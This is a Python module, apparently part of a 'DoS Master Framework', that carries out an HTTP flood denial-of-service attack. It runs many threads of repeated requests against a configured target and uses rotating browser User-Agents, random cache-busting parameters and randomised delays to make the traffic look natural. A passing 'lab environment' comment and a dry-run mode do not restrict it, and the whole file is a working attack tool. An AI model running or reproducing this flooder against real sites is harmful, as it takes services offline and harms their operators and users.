#!/usr/bin/env python3
"""
DoS Master Framework - HTTP Flood Attack Module
Professional HTTP flood implementation
"""

import threading
import time
import requests
import random
import urllib3
from typing import Dict, Any, List
from datetime import datetime

# Disable SSL warnings for lab environment
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class HTTPFlood:
    """HTTP flood attack implementation"""
    
    def __init__(self, config: Dict, logger):
        self.config = config
        self.logger = logger
        self.target_url = config['target']
        self.target_paths = config.get('target_paths', ['/'])
        self.duration = config.get('duration', 60)
        self.threads = config.get('threads', 20)
        self.rate_limit = config.get('rate', 0)
        self.request_timeout = config.get('request_timeout', 10)
        self.dry_run = config.get('dry_run', False)
        
        self.requests_sent = 0
        self.requests_successful = 0
        self.requests_failed = 0
        self.attack_active = False
        self.start_time = None
        self.worker_threads = []
        
        # Realistic User-Agent strings
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148',
            'Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0'
        ]
        
    def validate_config(self) -> bool:
        """Validate attack configuration"""
        try:
            if not self.target_url.startswith(('http://', 'https://')):
                self.logger.error("Target must be a valid HTTP/HTTPS URL")
                return False
                
            if self.duration <= 0 or self.duration > 3600:
                self.logger.error("Duration must be between 1 and 3600 seconds")
                return False
                
            if self.threads <= 0 or self.threads > 200:
                self.logger.error("Threads must be between 1 and 200")
                return False
                
            if not self.target_paths:
                self.target_paths = ['/']
            
            return True
            
        except Exception as e:
            self.logger.error(f"Configuration validation failed: {e}")
            return False
    
    def execute(self) -> Dict[str, Any]:
        """Execute HTTP flood attack"""
        self.logger.info(f"Starting HTTP flood attack against {self.target_url}")
        
        if self.dry_run:
            return self._simulate_attack()
        
        self.attack_active = True
        self.start_time = time.time()
        
        try:
            # Start worker threads
            for i in range(self.threads):
                thread = threading.Thread(target=self._http_worker, args=(i,))
                thread.start()
                self.worker_threads.append(thread)
                time.sleep(0.1)
            
            # Monitor attack progress
            self._monitor_attack()
            
            # Wait for all threads to complete
            for thread in self.worker_threads:
                thread.join()
            
            # Calculate results
            end_time = time.time()
            actual_duration = end_time - self.start_time
            avg_rate = self.requests_sent / actual_duration if actual_duration > 0 else 0
            
            result = {
                'attack_type': 'http_flood',
                'target': self.target_url,
                'target_paths': self.target_paths,
                'duration': actual_duration,
                'requests_sent': self.requests_sent,
                'requests_successful': self.requests_successful,
                'requests_failed': self.requests_failed,
                'success_rate': (self.requests_successful / self.requests_sent) * 100 if self.requests_sent > 0 else 0,
                'avg_rate': avg_rate,
                'threads_used': self.threads,
                'timestamp': datetime.now().isoformat()
            }
            
            self.logger.info(f"HTTP flood completed: {self.requests_sent} requests sent")
            return result
            
        except Exception as e:
            self.logger.error(f"HTTP flood attack failed: {e}")
            raise
        finally:
            self.attack_active = False
    
    def _http_worker(self, worker_id: int):
        """HTTP flood worker thread"""
        self.logger.debug(f"HTTP worker {worker_id} started")
        
        local_requests_sent = 0
        local_requests_successful = 0
        local_requests_failed = 0
        
        try:
            # Create session for connection reuse
            session = requests.Session()
            session.headers.update(self._generate_headers())
            
            while self.attack_active and (time.time() - self.start_time) < self.duration:
                try:
                    # Select random target path
                    path = random.choice(self.target_paths)
                    url = self.target_url.rstrip('/') + path
                    
                    # Add random parameters
                    params = {'_': int(time.time() * 1000)}
                    if random.random() > 0.5:
                        params['q'] = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=10))
                    
                    # Make request
                    response = session.get(url, params=params, 
                                         timeout=self.request_timeout, 
                                         verify=False)
                    
                    local_requests_sent += 1
                    
                    if response.status_code in [200, 301, 302, 404]:
                        local_requests_successful += 1
                    else:
                        local_requests_failed += 1
                    
                    # Rate limiting
                    if self.rate_limit > 0:
                        delay = self.threads / self.rate_limit
                        time.sleep(delay)
                    else:
                        # Random delay to appear more natural
                        time.sleep(random.uniform(0.1, 0.5))
                        
                except requests.RequestException as e:
                    local_requests_sent += 1
                    local_requests_failed += 1
                    self.logger.debug(f"Worker {worker_id} request failed: {str(e)[:50]}")
                    time.sleep(1)  # Longer delay on failure
                    
                except Exception as e:
                    self.logger.debug(f"Worker {worker_id} unexpected error: {e}")
                    break
            
            # Update global counters
            self.requests_sent += local_requests_sent
            self.requests_successful += local_requests_successful
            self.requests_failed += local_requests_failed
            
            session.close()
            
        except Exception as e:
            self.logger.error(f"HTTP worker {worker_id} failed: {e}")
            
        self.logger.debug(f"HTTP worker {worker_id} completed: {local_requests_sent} requests sent")
    
    def _generate_headers(self) -> Dict[str, str]:
        """Generate realistic HTTP headers"""
        return {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0'
        }
    
    def _monitor_attack(self):
        """Monitor attack progress"""
        while self.attack_active:
            elapsed = time.time() - self.start_time if self.start_time else 0
            remaining = max(0, self.duration - elapsed)
            
            if elapsed > 0:
                current_rate = self.requests_sent / elapsed
                success_rate = (self.requests_successful / self.requests_sent) * 100 if self.requests_sent > 0 else 0
                
                self.logger.info(f"HTTP flood progress: {elapsed:.1f}s elapsed, "
                               f"{self.requests_sent} requests sent, "
                               f"{current_rate:.1f} rps, "
                               f"{success_rate:.1f}% success, "
                               f"{remaining:.1f}s remaining")
            
            if remaining <= 0:
                self.attack_active = False
                break
                
            time.sleep(10)
    
    def _simulate_attack(self) -> Dict[str, Any]:
        """Simulate attack for dry-run mode"""
        self.logger.info("Simulating HTTP flood attack (dry-run mode)")
        
        estimated_requests = self.threads * 10 * self.duration
        time.sleep(2)
        
        return {
            'attack_type': 'http_flood',
            'target': self.target_url,
            'target_paths': self.target_paths,
            'duration': self.duration,
            'requests_sent': estimated_requests,
            'requests_successful': int(estimated_requests * 0.95),
            'requests_failed': int(estimated_requests * 0.05),
            'success_rate': 95.0,
            'avg_rate': estimated_requests / self.duration,
            'threads_used': self.threads,
            'timestamp': datetime.now().isoformat(),
            'dry_run': True
        }
    
    def stop(self):
        """Stop the attack"""
        self.logger.info("Stopping HTTP flood attack")
        self.attack_active = False
    
    def get_status(self) -> Dict[str, Any]:
        """Get current attack status"""
        elapsed = time.time() - self.start_time if self.start_time else 0
        current_rate = self.requests_sent / elapsed if elapsed > 0 else 0
        success_rate = (self.requests_successful / self.requests_sent) * 100 if self.requests_sent > 0 else 0
        
        return {
            'attack_type': 'http_flood',
            'active': self.attack_active,
            'elapsed_time': elapsed,
            'requests_sent': self.requests_sent,
            'success_rate': success_rate,
            'current_rate': current_rate,
            'threads_active': len([t for t in self.worker_threads if t.is_alive()])
        }